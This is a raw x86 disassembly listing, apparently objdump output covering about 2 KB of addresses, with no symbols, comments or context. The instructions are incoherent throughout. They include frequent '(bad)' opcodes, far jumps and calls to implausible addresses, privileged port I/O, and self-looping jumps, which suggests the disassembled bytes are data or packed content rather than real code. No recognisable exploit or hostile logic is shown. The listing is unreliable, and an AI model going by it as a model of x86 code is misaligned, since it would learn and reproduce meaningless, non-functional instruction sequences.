  40ef4a:	in     eax,dx
  40ef4b:	xor    bl,0x7
  40ef4e:	jmp    0x8d357656
  40ef53:	xchg   DWORD PTR [edi+edi*2],eax
  40ef56:	adc    ch,al
  40ef58:	sub    eax,0x429be8c8
  40ef5d:	jge    0x40efd4
  40ef5f:	xchg   DWORD PTR [eax-0x3c],edi
  40ef62:	jl     0x40eeeb
  40ef64:	in     al,0x7a
  40ef66:	adc    DWORD PTR gs:[eax-0x11],ebx
  40ef6a:	call   0x45c4:0x4106b13e
  40ef71:	jle    0x40efc0
  40ef73:	jge    0x40ef29
  40ef75:	outs   dx,BYTE PTR ds:[esi]
  40ef76:	inc    ebp
  40ef77:	adc    DWORD PTR [esi+edi*2],esi
  40ef7a:	mov    bl,0x8b
  40ef7c:	xchg   edi,eax
  40ef7d:	dec    ebx
  40ef7e:	scas   al,BYTE PTR es:[edi]
  40ef7f:	inc    esp
	...
  40ef90:	add    BYTE PTR [eax],al
  40ef92:	lock outs dx,BYTE PTR ds:[esi]
  40ef94:	jnp    0x40ef1c
  40ef96:	push   ds
  40ef97:	jle    0x40f008
  40ef99:	inc    ecx
  40ef9a:	or     al,0x8a
  40ef9c:	fwait
  40ef9d:	xchg   edi,eax
  40ef9e:	prefetch BYTE PTR [ebp+0x5d]
  40efa2:	pop    es
  40efa3:	jle    0x40ef8d
  40efa5:	cmp    BYTE PTR [esi+ebp*2-0x18],0xf6
  40efaa:	jae    0x40ef4a
  40efac:	call   0xffcadfb4
  40efb1:	jae    0x40ef3a
  40efb3:	jge    0x40efc2
  40efb5:	gs popa 
  40efb7:	jle    0x40efb7
  40efb9:	jmp    0xd228e22c
  40efbe:	ret    0x26
  40efc1:	jmp    0x6328e310
  40efc6:	jne    0x40ef58
  40efc8:	(bad)  
  40efc9:	cwde   
  40efca:	push   esp
  40efcb:	(bad)  
  40efcc:	jmp    0x1f9:0x3bac0e0f
  40efd3:	(bad)  
  40efd5:	lock out dx,al
  40efd7:	add    ch,BYTE PTR [ecx+ebx*8]
  40efda:	jp     0x40efe5
  40efdc:	sub    al,0x28
  40efde:	lock adc BYTE PTR [eax+0x9f7a395],al
  40efe5:	imul   esi,DWORD PTR [edi+0x3e],0x7173ec77
  40efec:	das    
  40efed:	xchg   edx,eax
  40efee:	ins    DWORD PTR es:[edi],dx
  40efef:	std    
  40eff0:	jmp    0x40f01a
  40eff2:	ins    BYTE PTR es:[edi],dx
  40eff3:	dec    ecx
  40eff4:	or     DWORD PTR [ecx+0x0],ebp
	...
  40f006:	add    BYTE PTR [eax],al
  40f008:	xchg   ebx,eax
  40f009:	or     DWORD PTR [edx],ecx
  40f00b:	sub    eax,0x300aceb9
  40f010:	loopne 0x40f05e
  40f012:	pop    eax
  40f013:	pusha  
  40f014:	or     BYTE PTR [ebx-0x2],bl
  40f017:	aam    0x5b
  40f019:	mov    WORD PTR [ecx+ecx*2+0x76],es
  40f01d:	ret    0xe9d7
  40f020:	repz push es
  40f022:	add    BYTE PTR [eax+esi*4+0x52],ah
  40f026:	dec    edi
  40f027:	ret    
  40f028:	hlt    
  40f029:	lock call DWORD PTR [edx-0x6d000f0d]
  40f030:	repz mov eax,DWORD PTR [ebp+esi*1-0x3d]
  40f035:	jge    0x40f04b
  40f037:	sahf   
  40f038:	sbb    al,0xc6
  40f03a:	(bad)  
  40f03b:	inc    DWORD PTR [edx]
  40f03d:	dec    ecx
  40f03e:	jb     0x40f062
  40f040:	pop    edx
  40f041:	psubusb mm0,QWORD PTR [eax]
  40f044:	gs fs std 
  40f047:	jne    0x40f04e
  40f049:	test   DWORD PTR [ebx-0x28],esi
  40f04c:	into   
  40f04d:	or     al,0xe4
  40f04f:	jmp    DWORD PTR [edi+ebx*4]
  40f052:	std    
  40f053:	jne    0x40f026
  40f055:	mov    al,ds:0x82aefcbb
  40f05a:	std    
  40f05b:	jne    0x40efee
  40f05d:	fwait
  40f05e:	xchg   esi,eax
  40f05f:	and    BYTE PTR [ecx-0x528a00f8],bl
  40f065:	fwait
  40f066:	js     0x40f0b7
  40f068:	dec    esi
  40f069:	cmp    ch,0x75
	...
  40f07c:	add    BYTE PTR [eax],al
  40f07e:	sbb    DWORD PTR [ebx-0x7d91b090],0x9b7575fd
  40f088:	push   0x8b826e4f
  40f08d:	inc    ebp
  40f08e:	stc    
  40f08f:	xor    ch,al
  40f091:	nop
  40f092:	add    al,0x82
  40f094:	std    
  40f095:	pop    edi
  40f096:	(bad)  
  40f097:	mov    edi,0x2d490cc0
  40f09c:	mov    ebp,esp
  40f09e:	retf   0xfa46
  40f0a1:	push   0x59
  40f0a3:	push   ds
  40f0a4:	inc    ebp
  40f0a5:	jmp    DWORD PTR [eax+eax*4]
  40f0a8:	out    0x81,al
  40f0aa:	pop    ebp
  40f0ab:	cmp    ebp,0xffffff89
  40f0ae:	test   BYTE PTR [ebp+edi*8+0x20a02175],al
  40f0b5:	std    
  40f0b6:	fiadd  WORD PTR [ecx-0x34efa98]
  40f0bc:	push   ecx
  40f0bd:	dec    esi
  40f0bf:	jge    0x40f07f
  40f0c1:	je     0x40f0d2
  40f0c3:	cmp    BYTE PTR [eax-0x9],ch
  40f0c6:	lock sub al,0x44
  40f0c9:	add    BYTE PTR [eax+0x36ef026d],cl
  40f0cf:	xchg   esi,eax
  40f0d0:	pop    edi
  40f0d1:	inc    ebp
  40f0d2:	xor    DWORD PTR [esi+0x32],ebp
  40f0d5:	call   FWORD PTR [ebp+0x66]
  40f0d8:	call   0xfde7:0x836d623d
  40f0df:	xor    al,0x85
  40f0e1:	inc    BYTE PTR [eax]
	...
  40f0f3:	add    bh,cl
  40f0f5:	rol    BYTE PTR [edi-0x6599c202],cl
  40f0fb:	xchg   DWORD PTR [ecx*2+0x69b2c883],ebp
  40f102:	add    dl,BYTE PTR [ebp+0x7b]
  40f105:	dec    ecx
  40f106:	jg     0x40f0cb
  40f108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f109:	sbb    al,0x1a
  40f10b:	add    BYTE PTR [edx],cl
  40f10d:	and    al,0x85
  40f10f:	je     0x40f0f9
  40f111:	xchg   ebp,eax
  40f112:	xlat   BYTE PTR ds:[ebx]
  40f113:	dec    ebx
  40f114:	(bad)  
  40f115:	pushf  
  40f116:	jns    0x40f15c
  40f118:	test   al,ch
  40f11a:	lds    eax,FWORD PTR [ebp-0x7ffbd138]
  40f120:	mov    bh,0x6d
  40f122:	push   cs
  40f123:	push   ecx
  40f124:	fdivr  st,st(5)
  40f126:	cmp    al,0x41
  40f128:	lock sbb al,0x9c
  40f12b:	jne    0x40f13e
  40f12d:	outs   dx,BYTE PTR ds:[esi]
  40f12e:	add    cl,BYTE PTR [ebx]
  40f130:	xor    BYTE PTR [ecx+0x0],bl
  40f133:	jmp    0x40f134
  40f135:	push   ebp
  40f136:	call   0xd5e8:0x2b6db145
  40f13d:	push   cs
  40f13e:	add    al,0x0
  40f140:	jmp    0x40f16f
  40f142:	mov    db0,edi
  40f145:	aad    0x7a
  40f147:	push   edi
  40f148:	daa    
  40f149:	xor    al,0xf8
  40f14b:	mov    edi,0x683256a4
  40f150:	lock push es
  40f152:	jmp    0x162f3eeb
  40f157:	cmp    eax,0x0
	...
  40f168:	add    BYTE PTR [eax],al
  40f16a:	mov    cl,0x6
  40f16c:	mov    ecx,0x10e8484
  40f171:	or     eax,0x9b057b83
  40f176:	xchg   ecx,eax
  40f177:	leave  
  40f178:	std    
  40f179:	sub    ebx,0x36
  40f17c:	sub    DWORD PTR [edx-0x22],ecx
  40f17f:	jp     0x40f16e
  40f181:	and    ecx,0xffffffa9
  40f184:	and    BYTE PTR [ebx],cl
  40f186:	inc    ebp
  40f187:	stos   BYTE PTR es:[edi],al
  40f188:	(bad)  
  40f18a:	retf   
  40f18b:	jp     0x40f1e8
  40f18d:	or     al,0xc8
  40f18f:	add    bl,BYTE PTR ds:0xafdab683
  40f195:	inc    esi
  40f196:	repz push es
  40f198:	adc    al,0x8f
  40f19a:	fwait
  40f19b:	mov    BYTE PTR [esp+edx*2-0x6e52855a],ch
  40f1a2:	sub    al,0x7b
  40f1a4:	cmp    BYTE PTR [ebx-0x661e8fc],al
  40f1aa:	sti    
  40f1ab:	outs   dx,BYTE PTR ds:[esi]
  40f1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ad:	and    al,0xf0
  40f1af:	push   es
  40f1b0:	loop   0x40f1f5
  40f1b2:	out    0x83,al
  40f1b4:	mov    ebx,0xa606f005
  40f1b9:	leave  
  40f1ba:	pop    edi
  40f1bb:	pop    es
  40f1bc:	jmp    0x2382e1c4
  40f1c1:	je     0x40f219
  40f1c3:	add    ch,cl
  40f1c5:	add    ebx,edx
  40f1c7:	push   es
  40f1c8:	rol    DWORD PTR [ebx],cl
  40f1ca:	fiadd  DWORD PTR [esi]
  40f1cc:	ret    
  40f1cd:	add    eax,DWORD PTR [eax]
	...
  40f1df:	add    BYTE PTR [ebp-0x3c],ch
  40f1e2:	pop    eax
  40f1e3:	aam    0x64
  40f1e5:	test   BYTE PTR [eax],bh
  40f1e7:	jnp    0x40f217
  40f1e9:	jp     0x40f183
  40f1eb:	sbb    BYTE PTR [esi+edi*2+0x7e1935ff],0xe7
  40f1f3:	dec    edi
  40f1f4:	int3   
  40f1f5:	push   es
  40f1f6:	add    dl,dh
  40f1f8:	mov    bl,0xf5
  40f1fa:	add    al,0x10
  40f1fc:	test   BYTE PTR [esi],al
  40f1fe:	add    cl,ch
  40f200:	or     ebx,DWORD PTR [edi+eiz*1-0x58]
  40f204:	repz jns 0x40f27b
  40f207:	fstp   DWORD PTR [ebx+0x47]
  40f20a:	push   eax
  40f20b:	(bad)  
  40f20c:	jb     0x40f1d7
  40f20e:	mov    bl,BYTE PTR [ecx]
  40f210:	add    DWORD PTR [edx+0x7872f6ef],0xb75c3b4f
  40f21a:	push   eax
  40f21b:	fidiv  WORD PTR [edx-0x72]
  40f21e:	test   ch,al
  40f220:	cmp    bh,BYTE PTR [ecx-0x2]
  40f223:	shr    edx,0xc8
  40f226:	inc    dh
  40f228:	add    dl,0xf3
  40f22b:	sbb    DWORD PTR [edx+edx*8+0x79f42846],edx
  40f232:	mov    ah,0xbd
  40f234:	sbb    bh,BYTE PTR [ecx-0x2]
  40f237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f238:	mov    BYTE PTR ds:0x789cf1e8,cl
  40f23e:	(bad)  
  40f23f:	pusha  
  40f240:	push   0x8ef651
	...
  40f255:	add    BYTE PTR [edx-0x11],dh
  40f258:	call   DWORD PTR [eax]
  40f25a:	push   edx
  40f25b:	rol    BYTE PTR [eax-0x17],0x72
  40f25f:	mov    dl,0xeb
  40f261:	jle    0x40f2d5
  40f263:	js     0x40f263
  40f265:	hlt    
  40f266:	out    0x6e,eax
  40f268:	in     al,dx
  40f269:	mov    ecx,0x64887872
  40f26e:	(bad)  [eax-0x2]
  40f271:	push   esi
  40f272:	dec    ebp
  40f273:	jns    0x40f2db
  40f275:	shr    BYTE PTR [edx],0xc6
  40f278:	(bad)  
  40f279:	push   DWORD PTR [esi-0x19081542]
  40f27f:	test   ch,bh
  40f281:	jne    0x40f298
  40f283:	in     eax,dx
  40f284:	rcl    BYTE PTR [eax-0x3a],1
  40f287:	test   BYTE PTR [edi-0x203027b],al
  40f28d:	call   DWORD PTR [esi+ecx*4-0x7b19082e]
  40f294:	dec    esi
  40f295:	push   0x3f4c88
  40f29a:	idiv   BYTE PTR [esi-0x79190816]
  40f2a0:	std    
  40f2a1:	jne    0x40f278
  40f2a3:	in     al,dx
  40f2a4:	mov    al,0x50
  40f2a6:	mov    BYTE PTR [esi+0x1c2dc009],0x83
  40f2ad:	mov    ebp,0xfffdfe7d
  40f2b2:	int    0x71
  40f2b4:	push   cs
  40f2b5:	(bad)  
  40f2b6:	fst    DWORD PTR [ebp+0xe083]
	...
  40f2cc:	outs   dx,BYTE PTR ds:[esi]
  40f2cd:	xchg   ch,bh
  40f2cf:	push   eax
  40f2d0:	rol    DWORD PTR [esi],0x4d
  40f2d3:	jmp    DWORD PTR [esi-0x16]
  40f2d6:	adc    cl,BYTE PTR [ebx]
  40f2d8:	dec    ecx
  40f2d9:	jg     0x40f2df
  40f2db:	push   eax
  40f2dc:	popa   
  40f2dd:	jb     0x40f32a
  40f2df:	jmp    DWORD PTR [esi-0x32]
  40f2e2:	and    eax,0x5e
  40f2e5:	xchg   ch,bh
  40f2e7:	adc    eax,0x6a000489
  40f2ec:	pop    ecx
  40f2ed:	ins    BYTE PTR es:[edi],dx
  40f2ee:	outs   dx,BYTE PTR ds:[esi]
  40f2ef:	inc    edi
  40f2f0:	sbb    BYTE PTR [ebx],al
  40f2f2:	push   DWORD PTR [ebp-0x2018b]
  40f2f8:	(bad)  
  40f2f9:	outs   dx,DWORD PTR ds:[esi]
  40f2fa:	or     ch,al
  40f2fc:	and    eax,0xc0fffd54
  40f301:	jg     0x40f2dd
  40f303:	div    eax
  40f305:	rol    BYTE PTR [eax-0x71ba0f97],1
  40f30b:	inc    esi
  40f30c:	mov    cl,0x6d
  40f30e:	jg     0x40f2c4
  40f310:	adc    al,0x31
  40f312:	cmp    esi,0xe80ebb1f
  40f318:	rcr    DWORD PTR [ebp-0x14860181],0x53
  40f31f:	test   BYTE PTR [edi],0x19
  40f322:	test   DWORD PTR [eax+ebx*1-0xf017ee7],edi
  40f329:	pop    eax
  40f32a:	xchg   BYTE PTR [ebx+0x68026df0],dl
	...
  40f340:	add    BYTE PTR [eax],al
  40f342:	jg     0x40f2e4
  40f344:	sar    edi,0x6c
  40f347:	stos   BYTE PTR es:[edi],al
  40f348:	jbe    0x40f399
  40f34a:	xlat   BYTE PTR ds:[ebx]
  40f34b:	xor    bl,BYTE PTR [esi+esi*8-0x31]
  40f34f:	pusha  
  40f350:	push   0x6b
  40f352:	inc    edx
  40f353:	pop    ecx
  40f354:	jg     0x40f360
  40f356:	mov    al,0xd9
  40f358:	inc    DWORD PTR [edx+0x74025235]
  40f35e:	es in  eax,dx
  40f360:	mov    ebp,0x7fb89fe3
  40f365:	jmp    DWORD PTR [ebx]
  40f367:	ret    
  40f368:	test   BYTE PTR [eax+ecx*4-0xf018050],bh
  40f36f:	sbb    eax,ebp
  40f371:	addr16 loopne 0x40f3e1
  40f374:	outs   dx,DWORD PTR ds:[esi]
  40f375:	mov    ebp,0xe80c1a7f
  40f37a:	add    ah,BYTE PTR [edi]
  40f37c:	cmp    esi,0xf66b3a6f
  40f382:	addr16 clc 
  40f384:	jg     0x40f3fa
  40f386:	call   0x57893c10
  40f38b:	call   0x695a80f
  40f390:	pop    esi
  40f391:	add    BYTE PTR [esi+0x77],0xd3
  40f395:	or     ecx,DWORD PTR [eax-0x42]
  40f398:	lahf   
  40f399:	xor    BYTE PTR [esi],0x77
  40f39c:	shl    DWORD PTR [edi+0x2e],cl
  40f39f:	mov    cl,0x20
  40f3a1:	js     0x40f3c9
  40f3a3:	ja     0x40f3e2
  40f3a5:	test   BYTE PTR [eax],0x0
	...
  40f3b8:	imul   DWORD PTR [esi-0x4f]
  40f3bb:	retf   0x7716
  40f3be:	sub    eax,0x256f2fb6
  40f3c3:	add    BYTE PTR [esi],0xf1
  40f3c6:	lock imul eax,esi,0xffffffcd
  40f3ca:	adc    eax,0x2cb0f680
  40f3cf:	js     0x40f3bf
  40f3d1:	jbe    0x40f3d8
  40f3d3:	imul   bh
  40f3d5:	pop    esi
  40f3d6:	jno    0x40f3a2
  40f3d8:	fidiv  WORD PTR [esi-0xb]
  40f3db:	mov    ch,0xa7
  40f3dd:	jle    0x40f3cc
  40f3df:	jg     0x40f3af
  40f3e1:	cld    
  40f3e2:	lock imul eax,DWORD PTR [eax+eax*8-0x23],0x7f
  40f3e8:	mov    esi,0xb677b0bc
  40f3ed:	jbe    0x40f3af
  40f3ef:	xchg   DWORD PTR [ebx],edi
  40f3f1:	jbe    0x40f3b8
  40f3f3:	jg     0x40f451
  40f3f5:	pop    edi
  40f3f6:	mov    ch,0x7f
  40f3f8:	sahf   
  40f3f9:	pop    edi
  40f3fa:	xor    al,0xd0
  40f3fc:	xchg   esi,eax
  40f3fd:	jbe    0x40f3ac
  40f3ff:	mov    ecx,0x7fa57eab
  40f404:	(bad)  
  40f405:	clc    
  40f406:	sub    al,0x7f
  40f408:	jle    0x40f480
  40f40a:	pop    ebx
  40f40b:	push   0x6c8d767e
  40f410:	aad    0xc2
  40f412:	test   DWORD PTR [edi+0x66],edi
  40f415:	mov    esp,0x765e7798
  40f41a:	inc    DWORD PTR [eax+0x0]
	...
  40f42c:	add    BYTE PTR [eax],al
  40f42e:	cmp    eax,edx
  40f430:	(bad)  
  40f431:	outs   dx,BYTE PTR ds:[esi]
  40f432:	iret   
  40f433:	mov    edx,0x74c75eeb
  40f438:	(bad)  
  40f439:	aam    0xef
  40f43b:	jne    0x40f4b1
  40f43d:	loope  0x40f40a
  40f43f:	dec    ebx
  40f440:	cld    
  40f441:	dec    esi
  40f442:	scas   eax,DWORD PTR es:[edi]
  40f443:	je     0x40f3f9
  40f445:	push   ebp
  40f446:	lahf   
  40f447:	je     0x40f447
  40f449:	push   ecx
  40f44a:	ffreep st(2)
  40f44c:	(bad)  
  40f44d:	ss xchg edi,eax
  40f44f:	retf   0x40f7
  40f452:	stos   BYTE PTR es:[edi],al
  40f453:	jb     0x40f453
  40f455:	es xchg edx,edi
  40f458:	sti    
  40f459:	adc    DWORD PTR [ebp+0x14],ebp
  40f45c:	add    cl,ch
  40f45e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f45f:	inc    edi
  40f460:	or     ebp,ecx
  40f462:	enter  0xeb80,0x6a
  40f466:	cmp    BYTE PTR [edx-0x74],ch
  40f469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f46a:	pop    edi
  40f46b:	(bad)  
  40f46c:	addr16 test eax,0x80ffc6ae
  40f472:	hlt    
  40f473:	int    0x40
  40f475:	jmp    0xd14cefc0
  40f47a:	push   ss
  40f47b:	(bad)  
  40f47c:	(bad)  
  40f47d:	(bad)  
  40f47e:	jmp    0x7c88:0xc4427346
  40f485:	(bad)
  40f488:	pop    esi
  40f489:	mov    esi,0xb14485e3
  40f48e:	ins    BYTE PTR es:[edi],dx
  40f48f:	repnz div DWORD PTR [ebp+0x0]
	...
  40f4a2:	add    BYTE PTR [eax],al
  40f4a4:	hlt    
  40f4a5:	push   es
  40f4a6:	add    BYTE PTR [edi],bl
  40f4a8:	out    dx,eax
  40f4a9:	dec    ebp
  40f4aa:	inc    esp
  40f4ab:	mov    eax,ds:0xe9000707
  40f4b0:	or     cl,al
  40f4b2:	(bad)  
  40f4b3:	adc    al,0xec
  40f4b5:	in     eax,dx
  40f4b6:	dec    ecx
  40f4b7:	add    BYTE PTR [esi],dl
  40f4b9:	dec    esp
  40f4ba:	dec    BYTE PTR [esp+edx*1+0x25e84edf]
  40f4c1:	adc    eax,DWORD PTR [eax]
  40f4c3:	add    dl,bl
  40f4c5:	int    0xa
  40f4c7:	push   0x59
  40f4c9:	xchg   esi,eax
  40f4ca:	inc    ebx
  40f4cb:	in     al,0x79
  40f4cd:	popa   
  40f4ce:	inc    DWORD PTR [esi-0x78]
  40f4d1:	or     edi,edi
  40f4d3:	jne    0x40f522
  40f4d5:	loope  0x40f4b3
  40f4d7:	dec    esi
  40f4d8:	scas   al,BYTE PTR es:[edi]
  40f4d9:	hlt    
  40f4da:	or     eax,eax
  40f4dc:	gs sbb eax,0x9086850
  40f4e2:	out    dx,eax
  40f4e3:	mov    esi,0x873f469
  40f4e8:	loope  0x40f490
  40f4ea:	imul   edi,edi,0xffffffde
  40f4ed:	loope  0x40f49b
  40f4ef:	dec    ebx
  40f4f0:	fdivrp st(4),st
  40f4f2:	std    
  40f4f3:	dec    ebp
  40f4f4:	add    DWORD PTR [ecx+0x6fd9f87b],ecx
  40f4fa:	mov    dh,0xe8
  40f4fc:	sub    DWORD PTR [ecx-0x3],eax
  40f4ff:	call   DWORD PTR [eax]
  40f501:	mov    BYTE PTR [esi],0x0
  40f504:	fs sub edx,0x83
	...
  40f517:	add    BYTE PTR [eax],al
  40f519:	add    BYTE PTR [ebp+0x23006887],dl
  40f51f:	dec    edx
  40f520:	std    
  40f521:	jne    0x40f4f4
  40f523:	loopne 0x40f4e5
  40f525:	dec    eax
  40f526:	mov    esi,0xad4587f2
  40f52b:	arpl   WORD PTR ds:0xff0ac847,bx
  40f531:	xor    eax,0x41202c
  40f536:	pop    esi
  40f537:	jl     0x40f53f
  40f539:	call   0x3e7ca7
  40f53e:	loope  0x40f551
  40f540:	inc    edi
  40f541:	inc    ecx
  40f542:	lock pop ebp
  40f544:	jmp    0xddfe:0x825df001
  40f54b:	jne    0x40f5b7
  40f54d:	fstp   QWORD PTR [ebp+esi*8+0x7c]
  40f551:	(bad)  
  40f552:	sbb    eax,0xf0412b0b
  40f557:	in     al,0xf6
  40f559:	pop    es
  40f55a:	pop    eax
  40f55b:	pop    ss
  40f55c:	jge    0x40f55c
  40f55e:	aas    
  40f55f:	push   esi
  40f560:	add    BYTE PTR [eax],al
  40f562:	lock fnstsw WORD PTR [esp+esi*2-0x8]
  40f567:	lds    ebx,FWORD PTR [edi]
  40f569:	jmp    DWORD PTR [edi]
  40f56b:	int    0x7c
  40f56d:	je     0x40f58b
  40f56f:	xor    eax,0xf80807f7
  40f574:	retf   
  40f575:	dec    BYTE PTR [edi]
  40f577:	daa    
  40f578:	inc    edx
  40f579:	add    esi,eax
  40f57b:	mov    dl,0x87
  40f57d:	jmp    0x40f57f
	...
  40f58f:	add    BYTE PTR [ebx+0x2a],dh
  40f592:	pusha  
  40f593:	push   ebp
  40f594:	lahf   
  40f595:	xchg   DWORD PTR [edx],eax
  40f597:	push   0x38
  40f599:	add    eax,0xa9d807f7
  40f59e:	retf   0xdffe
  40f5a1:	test   dh,0xfb
  40f5a4:	jae    0x40f560
  40f5a6:	comiss xmm6,DWORD PTR [ecx]
  40f5a9:	pop    esi
  40f5aa:	add    cl,BYTE PTR [edi]
  40f5ac:	ins    BYTE PTR es:[edi],dx
  40f5ad:	mov    edx,0xe0f00001
  40f5b2:	cmp    eax,0x41f0717
  40f5b7:	add    bh,bh
  40f5b9:	jmp    0x5e30f600
  40f5be:	jg     0x40f5fc
  40f5c0:	inc    DWORD PTR [ebx+eax*8]
  40f5c3:	call   DWORD PTR [edi-0xe4d7994]
  40f5c9:	pop    ebp
  40f5ca:	add    al,BYTE PTR [ebx+0x2d8a06c5]
  40f5d0:	xor    DWORD PTR [edi],eax
  40f5d2:	jmp    0xe7ed61e3
  40f5d7:	add    esi,eax
  40f5d9:	xchg   ebx,ecx
  40f5db:	fs adc eax,0xef03e8c6
  40f5e1:	mov    bl,BYTE PTR [edi+0x2]
  40f5e4:	lock push es
  40f5e6:	push   0x3e
  40f5e8:	pop    ebx
  40f5e9:	and    al,0x28
  40f5eb:	add    al,0xf0
  40f5ed:	add    ebp,DWORD PTR [ebp-0x71]
  40f5f0:	lock push es
  40f5f2:	jmp    0x40f677
	...
  40f603:	add    BYTE PTR [eax],al
  40f605:	add    ah,dh
  40f607:	arpl   WORD PTR [esi],ax
  40f609:	ret    
  40f60a:	das    
  40f60b:	jae    0x40f5ea
  40f60d:	xchg   DWORD PTR [esi+0x7303e905],esp
  40f613:	xor    edx,esp
  40f615:	sub    al,0xb1
  40f617:	push   es
  40f618:	jmp    0xe8396a29
  40f61d:	add    esi,eax
  40f61f:	ficom  WORD PTR [ebp-0x3c]
  40f622:	mov    al,0x6
  40f624:	xchg   ebx,eax
  40f625:	add    esi,edi
  40f627:	sbb    dl,bh
  40f629:	sub    al,0x31
  40f62b:	pop    es
  40f62c:	pusha  
  40f62d:	(bad)  
  40f62e:	fild   WORD PTR [esi+0x1df7b83]
  40f634:	gs fcomi st,st(0)
  40f637:	push   es
  40f638:	jmp    0xee1abc65
  40f63d:	cmc    
  40f63e:	mov    edi,0xf12fb72
  40f643:	enter  0x8ee8,0xc7
  40f647:	(bad)  
  40f648:	fdivrp st(1),st
  40f64a:	hlt    
  40f64b:	pop    edi
  40f64c:	push   ss
  40f64d:	add    eax,0xd27206f0
  40f652:	jmp    0x40f6d1
  40f654:	xor    ch,ah
  40f656:	push   0xffffffed
  40f658:	inc    DWORD PTR [ebp+edi*2-0x3d]
  40f65c:	repz loop 0x40f669
  40f65f:	add    DWORD PTR [esp+eax*1-0x6ffff90b],eax
  40f666:	jmp    0x0:0xe90007
	...
  40f679:	add    BYTE PTR [eax],al
  40f67b:	add    BYTE PTR [ebx-0x48],bl
  40f67e:	inc    esi
  40f67f:	sub    ah,ch
  40f681:	jno    0x40f6b9
  40f683:	xchg   ecx,eax
  40f684:	adc    eax,0xe6e90013
  40f689:	inc    esi
  40f68a:	push   cs
  40f68b:	ins    BYTE PTR es:[edi],dx
  40f68c:	shl    BYTE PTR [ecx-0x2],0xe9
  40f690:	outs   dx,BYTE PTR ds:[esi]
  40f691:	icebp  
  40f692:	pop    es
  40f693:	jmp    0xea2a8182
  40f698:	repz push es
  40f69a:	(bad)  
  40f69b:	fdivp  st(3),st
  40f69d:	pop    esi
  40f69e:	pop    edi
  40f69f:	mov    ds:0xac8870aa,eax
  40f6a4:	mov    ds:0x9af17670,eax
  40f6a9:	cli    
  40f6aa:	out    dx,eax
  40f6ab:	ss add edi,esi
  40f6ae:	out    0x67,eax
  40f6b0:	ss jno 0x40f6b1
  40f6b3:	xchg   ecx,eax
  40f6b4:	inc    edi
  40f6b5:	leave  
  40f6b6:	inc    eax
  40f6b7:	jmp    0x230f136
  40f6bc:	pop    ebp
  40f6bd:	or     eax,0x46f6e900
  40f6c2:	push   cs
  40f6c3:	ins    BYTE PTR es:[edi],dx
  40f6c4:	mov    al,ds:0xc5e9fe71
  40f6c9:	jno    0x40f656
  40f6cb:	lods   al,BYTE PTR ds:[esi]
  40f6cc:	pop    ebx
  40f6cd:	ret    0xa48c
  40f6d0:	dec    edi
  40f6d1:	ret    0xe969
  40f6d4:	int    0x71
  40f6d6:	push   esp
  40f6d7:	fsubrp st(0),st
  40f6d9:	adc    DWORD PTR [edi],ebp
  40f6db:	sub    ah,dh
  40f6dd:	std    
  40f6de:	mov    edi,0xde
	...
  40f6ef:	add    BYTE PTR [eax],al
  40f6f1:	add    BYTE PTR [edi],ah
  40f6f3:	cdq    
  40f6f4:	(bad)  
  40f6f5:	dec    DWORD PTR [ecx-0x52ba72fb]
  40f6fb:	push   ebp
  40f6fc:	std    
  40f6fd:	jne    0x40f6b0
  40f6ff:	in     al,dx
  40f700:	jae    0x40f6ee
  40f702:	push   esi
  40f703:	push   ss
  40f704:	jecxz  0x40f734
  40f706:	enter  0xb0a,0xc0
  40f70a:	fnsave [edx-0x75]
  40f70d:	inc    ebp
  40f70e:	jns    0x40f765
  40f710:	push   0x6a0af300
  40f715:	pop    es
  40f716:	add    ecx,DWORD PTR [ebx]
  40f718:	push   DWORD PTR [ebp+0x6d]
  40f71b:	in     al,dx
  40f71c:	adc    esp,edi
  40f71e:	aaa    
  40f71f:	dec    edx
  40f720:	dec    BYTE PTR [edx]
  40f722:	cdq    
  40f723:	popa   
  40f724:	push   esp
  40f725:	call   FWORD PTR [eiz*8-0x137f171a]
  40f72c:	std    
  40f72d:	mov    DWORD PTR [ecx+ebx*8-0x75],ebx
  40f731:	inc    ebp
  40f732:	mov    ecx,0xd575fd55
  40f737:	arpl   si,di
  40f739:	imul   ecx,DWORD PTR [esi],0x4cfefe63
  40f73f:	sar    ebp,1
  40f741:	adc    eax,0x411fae
  40f746:	add    al,ch
  40f748:	jb     0x40f773
  40f74a:	popa   
  40f74b:	add    eax,0xed47ef00
  40f750:	jae    0x40f75a
  40f752:	icebp  
  40f753:	xor    eax,DWORD PTR [esi-0x1]
	...
  40f766:	add    BYTE PTR [eax],al
  40f768:	imul   ah
  40f76a:	je     0x40f774
  40f76c:	(bad)  
  40f76d:	ja     0x40f771
  40f76f:	dec    DWORD PTR [esp+edi*8-0x19]
  40f773:	pop    eax
  40f774:	(bad)  
  40f775:	in     eax,dx
  40f776:	std    
  40f777:	call   FWORD PTR [ebx+ebp*8]
  40f77a:	std    
  40f77b:	jne    0x40f7f2
  40f77d:	out    dx,al
  40f77e:	jae    0x40f788
  40f780:	lock inc ebp
  40f782:	int    0x45
  40f784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f785:	inc    ecx
  40f786:	js     0x40f7fc
  40f788:	mov    esp,0x97488456
  40f78d:	mov    cl,0x78
  40f78f:	je     0x40f725
  40f791:	mov    ecx,0x1ed6eb0e
  40f796:	add    al,0x6a
  40f798:	lock test al,0xee
  40f79b:	jmp    0x40f814
  40f79d:	jnp    0x40f806
  40f79f:	sub    eax,0x74775db1
  40f7a4:	pusha  
  40f7a5:	xchg   al,ah
  40f7a7:	dec    eax
  40f7a8:	pop    edi
  40f7a9:	mov    DWORD PTR [esi+eax*8-0xc390f00],eax
  40f7b0:	jae    0x40f82d
  40f7b2:	outs   dx,BYTE PTR ds:[esi]
  40f7b3:	push   esi
  40f7b5:	jmp    0xb46a:0xe93ffd6b
  40f7bc:	sar    DWORD PTR ss:[eax+0x69],1
  40f7c0:	lock fsubr st,st(6)
  40f7c3:	mul    DWORD PTR [edi]
  40f7c5:	jnp    0x40f7e2
  40f7c7:	das    
  40f7c8:	mov    cl,0x5d
  40f7ca:	ja     0x40f840
	...
  40f7dc:	add    BYTE PTR [eax],al
  40f7de:	adc    al,0x31
  40f7e0:	out    dx,eax
  40f7e1:	pop    es
  40f7e2:	sbb    ah,dh
  40f7e4:	sar    esi,0x7
  40f7e7:	sbb    eax,0x26232c8
  40f7ed:	push   ebp
